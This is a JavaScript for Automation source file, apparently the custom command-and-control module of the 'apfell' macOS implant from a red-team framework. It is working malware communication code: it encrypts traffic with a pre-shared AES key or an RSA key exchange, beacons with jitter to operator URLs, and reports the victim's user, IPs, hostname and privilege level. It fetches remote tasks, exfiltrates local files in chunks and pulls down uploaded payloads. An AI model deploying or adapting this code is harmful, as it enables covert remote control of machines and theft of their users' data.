//-------------RESTFUL C2 mechanisms ---------------------------------
class customC2 extends baseC2{

	constructor(interval, baseurl){
		super(interval, baseurl);
		this.commands = [];
		this.c2_config = raw_c2_config;
		this.get_messages = this.c2_config['GET']['AgentMessage'];
        this.post_messages = this.c2_config['POST']['AgentMessage'];
        this.interval = this.c2_config['interval'];
        this.chunk_size = this.c2_config['chunk_size'];
        this.jitter = this.c2_config['jitter'];
        this.aes_psk = "AESPSK"; // base64 encoded key
        if(this.aes_psk !== ""){
		    this.parameters = $.CFDictionaryCreateMutable($.kCFAllocatorDefault, 0, $.kCFTypeDictionaryKeyCallBacks, $.kCFTypeDictionaryValueCallBacks);
		    $.CFDictionarySetValue(this.parameters, $.kSecAttrKeyType, $.kSecAttrKeyTypeAES);
		    $.CFDictionarySetValue(this.parameters, $.kSecAttrKeySizeInBits, $.kSecAES256);
		    $.CFDictionarySetValue(this.parameters, $.kSecAttrKeyClass, $.kSecAttrKeyClassSymmetric);
		    $.CFDictionarySetValue(this.parameters, $.kSecClass, $.kSecClassKey);
            this.raw_key = $.NSData.alloc.initWithBase64Encoding(this.aes_psk);
            let err = Ref();
            this.cryptokey = $.SecKeyCreateFromData(this.parameters, this.raw_key, err);
		}
        this.using_key_exchange = this.c2_config['key_exchange'];
        this.exchanging_keys = this.using_key_exchange;
        this.dateFormatter = $.NSDateFormatter.alloc.init;
        this.dateFormatter.setDateFormat("yyyy-MM-dd");
        if(this.c2_config['kill_date'] !== undefined && this.c2_config['kill_date'] !== ""){
            this.kill_date = this.dateFormatter.dateFromString(this.c2_config['kill_date']);
        }else{
            this.kill_date = $.NSDate.distantFuture;
        }
	}
    get_random_element(x){
	    return x[Math.floor(Math.random() * x.length)];
    }
	encrypt_message(uid, data){
	    // takes in the string we're about to send, encrypts it, and returns a new string
	    let err = Ref();
	    let encrypt = $.SecEncryptTransformCreate(this.cryptokey,err);
	    let b = $.SecTransformSetAttribute(encrypt, $("SecPaddingKey"), $("SecPaddingPKCS7Key"), err);
	    b= $.SecTransformSetAttribute(encrypt, $("SecEncryptionMode"), $("SecModeCBCKey"), err);

        //generate a random IV to use
	    let IV = $.NSMutableData.dataWithLength(16);
	    $.SecRandomCopyBytes($.kSecRandomDefault, 16, IV.bytes);
	    b = $.SecTransformSetAttribute(encrypt, $("SecIVKey"), IV, err);
	    // set our data to be encrypted
	    let nsdata = $(data).dataUsingEncoding($.NSUTF8StringEncoding);
        b=$.SecTransformSetAttribute(encrypt, $.kSecTransformInputAttributeName, nsdata, err);
        //$.CFShow(err[0]);
        let encryptedData = $.SecTransformExecute(encrypt, err);
        // now we need to prepend the IV to the encrypted data before we base64 encode and return it
        //generate the hmac
	    let hmac_transform = $.SecDigestTransformCreate($("HMAC-SHA2 Digest Family"), 256, err);
	    let hmac_input = $.NSMutableData.dataWithLength(0);
	    hmac_input.appendData(IV);
	    hmac_input.appendData(encryptedData);
		b=$.SecTransformSetAttribute(hmac_transform, $.kSecTransformInputAttributeName, hmac_input, err);
		b=$.SecTransformSetAttribute(hmac_transform, $.kSecDigestHMACKeyAttribute, $.NSData.alloc.initWithBase64Encoding(this.aes_psk), err);
		let hmac_data = $.SecTransformExecute(hmac_transform, err);

        let final_message = $.NSMutableData.dataWithLength(0);
        final_message.appendData( $(uid).dataUsingEncoding($.NSUTF8StringEncoding) );
        final_message.appendData(IV);
        final_message.appendData(encryptedData);
        final_message.appendData(hmac_data);
        return final_message.base64EncodedStringWithOptions(0);
	}
	decrypt_message(nsdata){
        //takes in a base64 encoded string to be decrypted and returned
        //console.log("called decrypt");
        let err = Ref();
        let decrypt = $.SecDecryptTransformCreate(this.cryptokey, err);
        $.SecTransformSetAttribute(decrypt, $("SecPaddingKey"), $("SecPaddingPKCS7Key"), err);
	    $.SecTransformSetAttribute(decrypt, $("SecEncryptionMode"), $("SecModeCBCKey"), err);
	    //console.log("making ranges");
        //need to extract out the first 16 bytes as the IV and the rest is the message to decrypt
        let iv_range = $.NSMakeRange(0, 16);
        let message_range = $.NSMakeRange(16, nsdata.length - 48); // 16 for IV 32 for hmac
        let hmac_range = $.NSMakeRange(nsdata.length - 32, 32);
        let hmac_data_range = $.NSMakeRange(0, nsdata.length - 32); // hmac includes IV + ciphertext
        //console.log("carving out iv");
        let iv = nsdata.subdataWithRange(iv_range);
        $.SecTransformSetAttribute(decrypt, $("SecIVKey"), iv, err);
        let message = nsdata.subdataWithRange(message_range);
        $.SecTransformSetAttribute(decrypt, $("INPUT"), message, err);
        // create an hmac and verify it matches
        let message_hmac = nsdata.subdataWithRange(hmac_range);
        let hmac_transform = $.SecDigestTransformCreate($("HMAC-SHA2 Digest Family"), 256, err);
		$.SecTransformSetAttribute(hmac_transform, $.kSecTransformInputAttributeName, nsdata.subdataWithRange(hmac_data_range), err);
		$.SecTransformSetAttribute(hmac_transform, $.kSecDigestHMACKeyAttribute, $.NSData.alloc.initWithBase64Encoding(this.aes_psk), err);
		let hmac_data = $.SecTransformExecute(hmac_transform, err);
		if(hmac_data.isEqualToData(message_hmac)){
			let decryptedData = $.SecTransformExecute(decrypt, Ref());
	        //console.log("making a string from the message");
	        let decrypted_message = $.NSString.alloc.initWithDataEncoding(decryptedData, $.NSUTF8StringEncoding);
	        //console.log(decrypted_message.js);
	        return decrypted_message;
		}
		else{
			return undefined;
		}
	}
    negotiate_key(){
        // Generate a public/private key pair
        let parameters = $({"type": $("42"), "bsiz": 4096, "perm": false});
        let err = Ref();
        let privatekey = $.SecKeyCreateRandomKey(parameters, err);
        //console.log("generated new key");
        let publickey = $.SecKeyCopyPublicKey(privatekey);
        let exported_public = $.SecKeyCopyExternalRepresentation(publickey, err);
        //$.CFShow($.CFMakeCollectable(err[0]));
        try{
        	//this is the catalina case
        	let b64_exported_public = $.CFMakeCollectable(exported_public);
        	b64_exported_public = b64_exported_public.base64EncodedStringWithOptions(0).js; // get a base64 encoded string version
        	exported_public = b64_exported_public;
        }catch(error){
        	//this is the mojave and high sierra case
        	exported_public = exported_public.base64EncodedStringWithOptions(0).js;
        }
        let s = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
	    let session_key = Array(20).join().split(',').map(function() { return s.charAt(Math.floor(Math.random() * s.length)); }).join('');
	    let initial_message = {"session_id": session_key, "pub_key": exported_public, "action": "staging_rsa"};
	   // Encrypt our initial message with sessionID and Public key with the initial AES key
    while(true){
      try{
        //let req = this.create_message(this.get_random_element(this.post_messages), initial_message, apfell.uuid);
        //let stage1 = this.make_request(req);
        let stage1 = this.make_request("POST", apfell.uuid, initial_message);
        let enc_key = $.NSData.alloc.initWithBase64Encoding(stage1['session_key']);
        let dec_key = $.SecKeyCreateDecryptedData(privatekey, $.kSecKeyAlgorithmRSAEncryptionOAEPSHA1, enc_key, err);
        // Adjust our global key information with the newly adjusted session key
        try{
            this.aes_psk = dec_key.base64EncodedStringWithOptions(0).js; // base64 encoded key
        }catch(error){
            let dec_key_collectable = $.CFMakeCollectable(dec_key);
            dec_key_collectable = dec_key_collectable.base64EncodedStringWithOptions(0).js;
            this.aes_psk = dec_key_collectable;
        }
        //console.log(JSON.stringify(json_response));
        this.parameters = $({"type": $.kSecAttrKeyTypeAES});
        this.raw_key = $.NSData.alloc.initWithBase64Encoding(this.aes_psk);
        this.cryptokey = $.SecKeyCreateFromData(this.parameters, this.raw_key, Ref());
        this.exchanging_keys = false;
        return stage1['uuid'];
      }catch(error){
        //console.log("error in negotiate_key: " + error.toString());
        $.NSThread.sleepForTimeInterval(this.gen_sleep_time());  // don't spin out crazy if the connection fails
      }
    }
  }
  gen_sleep_time(){
      //generate a time that's this.interval += (this.interval * 1/this.jitter)
      let plus_min = Math.round(Math.random());
      if(plus_min === 1){
          return this.interval + (this.interval * (Math.round(Math.random()*this.jitter)/100));
      }else{
          return this.interval - (this.interval * (Math.round(Math.random()*this.jitter)/100));
      }
    }
  prepend(){
    return arguments[1] + arguments[0];
  }
  r_prepend(){
    return arguments[0].slice(String(arguments[1]).length);
  }
  append(){
    return arguments[0] + arguments[1];
  }
  r_append(){
    return arguments[0].slice(0, -1 * String(arguments[1]).length);
  }
  b64(){
    return base64_encode(String(arguments[0]));
  }
  r_b64(){
    return base64_decode(String(arguments[0]));
  }
  random_mixed(){
      let m = [...Array(Number(arguments[1]))].map(i=>(~~(Math.random()*36)).toString(36)).join('');
      return arguments[0] + m;
  }
  r_random_mixed(){
      return arguments[0].slice(0, -1 * Number(arguments[1]));
    }
  random_number(){
      let m = [...Array(Number(arguments[1]))].map(i=>(~~(Math.random()*10)).toString(10)).join('');
      return arguments[0] + m;
  }
  r_random_number(){
      return arguments[0].slice(0, -1 * Number(arguments[1]));
    }
  random_alpha(){
      let s = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
      let m = Array(Number(arguments[1])).join().split(',').map(function() { return s.charAt(Math.floor(Math.random() * s.length)); }).join('');
      return arguments[0] + m;
  }
  r_random_alpha(){
      return arguments[0].slice(0, -1 * Number(arguments[1]));
    }
  choose_random(){
        let choice = Math.floor(Math.random()* arguments[1].length);
        if(choice === arguments[1].length){choice -= 1;}
        return arguments[0] + arguments[1][choice];
    }
    r_choose_random(){
	    for(let i = 0; i < arguments[1].length; i++){
	        if(arguments[0].includes(arguments[1][i])){
	            return arguments[0].replace(arguments[1][i], "");
            }
        }
	    return arguments[0];
    }
    get_value(value, transforms){
      let tmp = value;
      try {
          if (transforms.length > 0) {
              for (let i = transforms.length - 1; i >= 0; i--) {
                  switch (transforms[i]['function']) {
                      case "base64":
                          tmp = this.r_b64(tmp);
                          break;
                      case "prepend":
                          tmp = this.r_prepend(tmp, transforms[i]['parameters']);
                          break;
                      case "append":
                          tmp = this.r_append(tmp, transforms[i]['parameters']);
                          break;
                      case "random_mixed":
                          tmp = this.r_random_mixed(tmp, transforms[i]['parameters']);
                          break;
                      case "random_number":
                          tmp = this.r_random_number(tmp, transforms[i]['parameters']);
                          break;
                      case "random_alpha":
                          tmp = this.r_random_alpha(tmp, transforms[i]['parameters']);
                          break;
                      case "choose_random":
                          tmp = this.r_choose_random(tmp, transforms[i]['parameters']);
                  }
              }
          }
          return tmp;
      }catch(error){
          return "";
      }
    }
    retrieve_message(response, method="POST"){
      let data = this.get_value(($.NSString.alloc.initWithDataEncoding(response, $.NSUTF8StringEncoding)).js, this.c2_config[method]['ServerBody']);
      //console.log("in retrieve_message, returning: " + data);
      return data;
    }
    create_value(value, transforms){
      for(let i = 0; i < transforms.length; i++){
        switch(transforms[i]['function']){
          case "base64":
              value = this.b64(value);
              break;
          case "prepend":
              value = this.prepend(value, transforms[i]['parameters']);
              break;
          case "append":
              value = this.append(value, transforms[i]['parameters']);
              break;
          case "random_mixed":
              value = this.random_mixed(value, transforms[i]['parameters']);
              break;
          case "random_number":
              value = this.random_number(value, transforms[i]['parameters']);
              break;
          case "random_alpha":
              value = this.random_alpha(value, transforms[i]['parameters']);
              break;
            case "choose_random":
                value = this.choose_random(value, transforms[i]['parameters']);
        }
      }
      return value;
    }
    create_message(endpoint, data, agent_id=apfell.id, method="POST"){
	    if(this.aes_psk !== ""){
            data = this.encrypt_message(agent_id, JSON.stringify(data)).js;
        }else if(typeof(sendData) === "string"){
        	data = $(uid + sendData).dataUsingEncoding($.NSUTF8StringEncoding);
            data = data.base64EncodedStringWithOptions(0);
        }else{
	        data = $(agent_id + JSON.stringify(data)).dataUsingEncoding($.NSUTF8StringEncoding);
            data = data.base64EncodedStringWithOptions(0).js;
        }
        let base_url = this.get_random_element(endpoint['urls']);
        let base_uri = endpoint['uri'];
        for(let i in endpoint['urlFunctions']){
            let value = endpoint['urlFunctions'][i]['value'];
            if(value === undefined){value = "";}
            if(value === "message"){value = data;}
            value = this.create_value(value, endpoint['urlFunctions'][i]['transforms']);
            base_uri = base_uri.replace(endpoint['urlFunctions'][i]['name'], value);
        }
        let query_string = "?";
        for(let i in endpoint['QueryParameters']){
            let value = endpoint['QueryParameters'][i]['value'];
            if(value === undefined){value = "";}
            if(value === "message"){value = data;}
            value = this.create_value(value, endpoint['QueryParameters'][i]['transforms']);
            let NSCharacterSet = $.NSCharacterSet.characterSetWithCharactersInString("/+=\n").invertedSet;
            value = $(value).stringByAddingPercentEncodingWithAllowedCharacters(NSCharacterSet).js;
            query_string += endpoint['QueryParameters'][i]['name'] + "=" + value + "&";
        }
        base_uri += query_string.slice(0, -1); //take off trailing & or ?
        let cookies = {};
        for(let i in endpoint['Cookies']){
            let value = endpoint['Cookies'][i]['value'];
            if(value === undefined){ value = "";}
            if(value === "message"){ value = data;}
            value = this.create_value(value, endpoint['Cookies'][i]['transforms']);
            cookies[endpoint['Cookies'][i]['name']] = value;
        }
        let headers = endpoint['AgentHeaders'];
        let cookie_header = "";
        for(let i in cookies){
            cookie_header += i + "=" + cookies[i] + ";";
        }
        if(cookie_header !== ""){
            headers['Cookie'] = cookie_header;
        }
        let url = base_url + base_uri;
        let body = this.create_value(data, endpoint['Body']);
        // now make the request object
        let req = $.NSMutableURLRequest.alloc.initWithURL($.NSURL.URLWithString(url));
        for(let i in headers) {
            req.setValueForHTTPHeaderField($.NSString.alloc.initWithUTF8String(headers[i]), $.NSString.alloc.initWithUTF8String(i));
        }
        if(method === "POST") {
            req.setHTTPMethod($.NSString.alloc.initWithUTF8String("POST"));
            let postData = $(body).dataUsingEncodingAllowLossyConversion($.NSASCIIStringEncoding, true);
            let postLength = $.NSString.stringWithFormat("%d", postData.length);
            req.addValueForHTTPHeaderField(postLength, $.NSString.alloc.initWithUTF8String('Content-Length'));
            req.setHTTPBody(postData);
        }
        return req;
    }
  getConfig(){
    //A RESTful base config consists of the following:
    //  BaseURL (includes Port), CallbackInterval, KillDate (not implemented yet)
    let config = {
      "C2": {
          "commands": this.commands.join(","),
          "api_version": this.api_version,
          "aes_psk": this.aes_psk,
          "config": this.c2_config
      },
      "Host": {
          "user": apfell.user,
          "fullName": apfell.fullName,
          "ips": apfell.ip,
          "hosts": apfell.host,
          "environment": apfell.environment,
          "uptime": apfell.uptime,
          "args": apfell.args,
          "pid": apfell.pid,
          "apfell_id": apfell.id,
          "payload_id": apfell.uuid
      }};
    return JSON.stringify(config, null, 2);
  }
  checkin(ip, pid, user, host, os, architecture, domain){
    let info = {'ip':ip,'pid':pid,'user':user,'host':host,'uuid':apfell.uuid, "os": os, "architecture": architecture, "domain": domain, "action": "checkin"};
    info["process_name"] = apfell.procInfo.processName.js;
    info["sleep_info"] = "Sleep interval set to " + C2.interval + " and sleep jitter updated to " + C2.jitter;
    if(user === 'root'){info['integrity_level'] = 3;}
    //let req = null;
    let jsondata = null;
    if(this.exchanging_keys){
        let sessionID = this.negotiate_key();
        jsondata = this.make_request("POST", sessionID, info);
    }else{
        jsondata = this.make_request("POST", apfell.uuid, info);
    }
    apfell.id = jsondata.id;
    // if we fail to get an ID number then exit the application
    if(apfell.id === undefined){ $.NSApplication.sharedApplication.terminate(this); }
    return jsondata;
  }
  getTasking(){
    while(true){
        try{
            let task = this.make_request("GET", apfell.id,  {"tasking_size":1, "action": "get_tasking"});
            return task['tasks'];
        }
        catch(error){
            //console.log("error in getTasking: " + error.toString());
            $.NSThread.sleepForTimeInterval(this.gen_sleep_time());  // don't spin out crazy if the connection fails
        }
    }
  }
  postResponse(task, data){
    //depending on the amount of data we're sending, we might need to chunk it
    data['task_id'] = task.id;
    let postData = {"action": "post_response", "responses": [data]};
    return this.make_request("POST", apfell.id, postData );
  }
  make_request(method="POST", uid=apfell.id, data=null){
    while(true){
      try{
          let req;
          if(method === "POST"){
              if(this.post_messages.length > 0) {
                  req = this.create_message(this.get_random_element(this.post_messages), data, uid, method);
              }else{
                  req = this.create_message(this.get_random_element(this.get_messages), data, uid, method);
              }
          }else{
              if(this.get_messages.length > 0){
                  req = this.create_message(this.get_random_element(this.get_messages), data, uid, method);
              }else{
                  req = this.create_message(this.get_random_element(this.post_messages), data, uid, method);
              }
          }
          //for some reason it sometimes randomly fails to send the data, throwing a JSON error. loop to fix for now
        let response = Ref();
        let error = Ref();
        let responseData = $.NSURLConnection.sendSynchronousRequestReturningResponseError(req,response,error);
        responseData = this.retrieve_message(responseData, method);
        if( responseData.length < 36){
            $.NSThread.sleepForTimeInterval(this.gen_sleep_time());
            continue;
        }
        let resp = $.NSData.alloc.initWithBase64Encoding(responseData);
        let uuid_range = $.NSMakeRange(0, 36);
        let message_range = $.NSMakeRange(36, resp.length - 36);
        let uuid = $.NSString.alloc.initWithDataEncoding(resp.subdataWithRange(uuid_range), $.NSUTF8StringEncoding).js;
        //console.log("carving out rest of message");
        if(uuid !== apfell.uuid && uuid !== apfell.id && uuid !== uid){
            //console.log("id doesn't match: " + uuid);
            $.NSThread.sleepForTimeInterval(this.gen_sleep_time());
            continue;
        }
        resp = resp.subdataWithRange(message_range); //could either be plaintext json or encrypted bytes
        //we're not doing the initial key exchange
        if(this.aes_psk !== ""){
            //if we do need to decrypt the response though, do that
            resp = ObjC.unwrap(this.decrypt_message(resp));
            return JSON.parse(resp);
        }else{
            //we don't need to decrypt it, so we can just parse and return it
            return JSON.parse(ObjC.deepUnwrap($.NSString.alloc.initWithDataEncoding(resp, $.NSUTF8StringEncoding)));
        }
      }
      catch(error){
          //console.log("error in make_request: "  + error.toString());
          $.NSThread.sleepForTimeInterval(this.gen_sleep_time());  // don't spin out crazy if the connection fails
      }
    }
  }
  download(task, params){
    let output = "";
    if( does_file_exist(params)){
        let offset = 0;
        let chunkSize = this.chunk_size; //3500;
        let full_path = params;
        try{
            let fm = $.NSFileManager.defaultManager;
            let pieces = ObjC.deepUnwrap(fm.componentsToDisplayForPath(params));
            full_path = "/" + pieces.slice(1).join("/");
            var handle = $.NSFileHandle.fileHandleForReadingAtPath(full_path);
            // Get the file size by seeking;
            var fileSize = handle.seekToEndOfFile;
        }catch(error){
            return {'status': 'error', 'user_output': error.toString(), "completed": true};
        }
        // always round up to account for chunks that are < chunksize;
        let numOfChunks = Math.ceil(fileSize / chunkSize);
        let registerData = {'total_chunks': numOfChunks, "full_path": full_path};
        let registerFile = this.postResponse(task, registerData);
        if (registerFile['responses'][0]['status'] === "success"){
            handle.seekToFileOffset(0);
            let currentChunk = 1;
            this.postResponse(task, {"user_output": JSON.stringify({
						"agent_file_id": registerFile["file_id"],
						"total_chunks": numOfChunks
					})});
            let data = handle.readDataOfLength(chunkSize);
            while(parseInt(data.length) > 0 && offset < fileSize){
                // send a chunk
                let fileData = {'chunk_num': currentChunk, 'chunk_data': data.base64EncodedStringWithOptions(0).js, 'file_id': registerFile['responses'][0]['file_id']};
                let response = this.postResponse(task, fileData);
                if(response['responses'][0]['status'] === 'success'){
                  offset += parseInt(data.length);
                  handle.seekToFileOffset(offset);
                  currentChunk += 1;
                  data = handle.readDataOfLength(chunkSize);
                }
                $.NSThread.sleepForTimeInterval(this.gen_sleep_time());
            }
            output = {"completed":true, "file_id": registerFile['responses'][0]['file_id']};
        }
        else{
           output = {'status': 'error', 'user_output': "Failed to register file to download", "completed": true};
        }
    }
    else{
        output = {'status': 'error', 'user_output': "file does not exist", "completed": true};
    }
    return output;
  }
  upload(task, file_id, full_path){
    try{
        let data = {"action": "upload", "file_id": file_id, "chunk_size": this.chunk_size, "chunk_num": 1, "full_path": full_path, "task_id": task.id};
        let chunk_num = 1;
        let total_chunks = 1;
        let total_data = $.NSMutableData.dataWithLength(0);
        do{
            let file_data = this.make_request("POST", apfell.id, data);
            if(file_data['chunk_num'] === 0){
                return {'status': 'error', 'user_output': "Error from the server", "completed": true};
            }
            chunk_num = file_data['chunk_num'];
            total_chunks = file_data['total_chunks'];
            total_data.appendData($.NSData.alloc.initWithBase64Encoding($(file_data['chunk_data'])));
            data = {"action": "upload", "file_id": file_id, "chunk_size": this.chunk_size, "chunk_num": chunk_num + 1, "task_id": task.id};
        }while(chunk_num < total_chunks);
      return total_data;
    }catch(error){
        return {'status': 'error', 'user_output': error.toString(), "completed": true};
    }
  }
}
//------------- INSTANTIATE OUR C2 CLASS BELOW HERE IN MAIN CODE-----------------------
ObjC.import('Security');
C2 = new customC2();
